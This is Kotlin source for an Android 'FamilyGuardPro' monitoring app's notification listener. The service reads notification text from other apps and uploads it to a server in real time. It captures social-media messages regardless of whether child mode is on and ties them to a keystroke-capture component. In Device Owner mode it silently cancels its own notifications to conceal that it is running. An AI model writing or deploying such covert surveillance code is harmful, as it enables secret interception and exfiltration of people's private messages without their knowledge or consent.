package com.familyguardpro.services

import android.app.Notification
import android.content.pm.PackageManager
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.models.NotificationData
import com.familyguardpro.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class NotificationListener : NotificationListenerService() {
    
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var keywordAlertService: KeywordAlertService? = null
    private var socialMediaExtractor: SocialMediaChatExtractor? = null
    private var isDeviceOwnerMode: Boolean = false
    
    companion object {
        private const val TAG = "NotificationListener"
        
        // Apps to skip
        private val SKIP_PACKAGES = setOf(
            "com.android.systemui",
            "android",
            "com.familyguardpro"
        )
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "NotificationListener connected")
        keywordAlertService = KeywordAlertService(applicationContext)
        socialMediaExtractor = SocialMediaChatExtractor(applicationContext)
        
        // Check Device Owner mode once
        isDeviceOwnerMode = try {
            val doManager = com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(applicationContext)
            doManager.isDeviceOwner()
        } catch (e: Exception) {
            false
        }
        
        // In Device Owner mode, immediately cancel any existing FamilyGuard notifications
        if (isDeviceOwnerMode) {
            cancelOwnNotifications()
        }
    }
    
    /**
     * Cancel all FamilyGuard notifications that may have been posted before we connected
     */
    private fun cancelOwnNotifications() {
        try {
            val activeNotifications = activeNotifications
            for (sbn in activeNotifications) {
                if (sbn.packageName == "com.familyguardpro") {
                    Log.d(TAG, "🚫 Auto-cancelling FamilyGuard notification ${sbn.id} in DO mode")
                    cancelNotification(sbn.key)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not cancel own notifications: ${e.message}")
        }
    }
    
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let { notification ->
            Log.d(TAG, "📩 Notification from: ${notification.packageName}")
            
            // In Device Owner mode, auto-cancel our own notifications immediately
            if (isDeviceOwnerMode && notification.packageName == "com.familyguardpro") {
                Log.d(TAG, "🚫 Auto-cancelling FamilyGuard notification ${notification.id} in DO mode")
                try {
                    cancelNotification(notification.key)
                } catch (e: Exception) {
                    Log.w(TAG, "Could not cancel notification: ${e.message}")
                }
                return
            }
            
            // ALWAYS capture social media notifications (like deleted message recovery apps)
            if (SocialMediaChatExtractor.isSocialMediaApp(notification.packageName)) {
                Log.d(TAG, "🔵 Social media notification detected: ${notification.packageName}")
                extractSocialMediaMessage(notification)
            }
            
            // Only capture regular notifications if child mode is active
            if (shouldCapture(notification)) {
                captureNotification(notification)
            }
        }
    }
    
    /**
     * Extract and sync social media chat messages
     * Uses SmartKeystrokeCorrelator for deduplication of sent messages
     */
    private fun extractSocialMediaMessage(sbn: StatusBarNotification) {
        try {
            Log.d(TAG, "🔍 Extracting social media from: ${sbn.packageName}")
            val message = socialMediaExtractor?.parseNotification(sbn)
            if (message != null) {
                Log.d(TAG, "💬 Social message: ${message.appName} | ${message.contactName} | ${message.messageText.take(50)}")
                
                // Check if this correlates with a keystroke session (sent message)
                val correlator = SmartKeystrokeCorrelator.instance
                if (correlator != null) {
                    val isCorrelated = correlator.correlateWithNotification(
                        appPackage = message.appPackage,
                        contactName = message.contactName,
                        messageText = message.messageText,
                        timestamp = message.timestamp
                    )
                    
                    if (isCorrelated) {
                        Log.d(TAG, "🔗 Message correlated - already captured via keystrokes (skipping duplicate)")
                        return // Don't save duplicate - keystroke version already saved
                    }
                }
                
                // This is a RECEIVED message - save it
                socialMediaExtractor?.saveAndSyncMessage(message)
            } else {
                Log.d(TAG, "⚠️ parseNotification returned null for ${sbn.packageName}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error extracting social media message", e)
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Optional: Track when notifications are removed
    }
    
    private fun shouldCapture(sbn: StatusBarNotification): Boolean {
        // Skip system and own notifications
        if (SKIP_PACKAGES.contains(sbn.packageName)) {
            return false
        }
        
        // Only capture if child mode is active
        val app = applicationContext as? FamilyGuardApp
        val prefs = app?.preferenceManager
        
        if (prefs?.isChildMode() != true) {
            return false
        }
        
        // Check if notification capture is enabled
        if (prefs.isNotificationCaptureEnabled() != true) {
            return false
        }
        
        return true
    }
    
    private fun captureNotification(sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()
            val content = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
            
            // Get app name
            val pm = packageManager
            val appName = try {
                val appInfo = pm.getApplicationInfo(sbn.packageName, 0)
                pm.getApplicationLabel(appInfo).toString()
            } catch (e: PackageManager.NameNotFoundException) {
                sbn.packageName
            }
            
            // Get device ID
            val app = applicationContext as? FamilyGuardApp
            val deviceId = app?.preferenceManager?.getDeviceId() ?: return
            
            val notificationData = NotificationData(
                id = sbn.id.toString(),
                deviceId = deviceId,
                packageName = sbn.packageName,
                appName = appName,
                title = title,
                text = content ?: bigText,
                timestamp = sbn.postTime
            )
            
            Log.d(TAG, "Captured notification from $appName: $title")
            
            // Scan for suspicious keywords
            keywordAlertService?.scanNotification(
                title = title,
                text = content ?: bigText,
                packageName = sbn.packageName
            )
            
            // Upload to server
            uploadNotification(notificationData)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing notification", e)
        }
    }
    
    private fun uploadNotification(notification: NotificationData) {
        // Send via WebSocket for REAL-TIME delivery (instant, 0 delay)
        WebSocketSyncService.sendNotification(notification)
        
        // Also upload via REST API for persistence/backup
        scope.launch {
            try {
                val result = ApiClient.uploadNotification(notification)
                result.fold(
                    onSuccess = {
                        Log.d(TAG, "Notification uploaded successfully")
                    },
                    onFailure = { error ->
                        Log.e(TAG, "Failed to upload notification: ${error.message}")
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Error uploading notification", e)
            }
        }
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d(TAG, "NotificationListener disconnected")
        keywordAlertService = null
        socialMediaExtractor?.destroy()
        socialMediaExtractor = null
    }
}
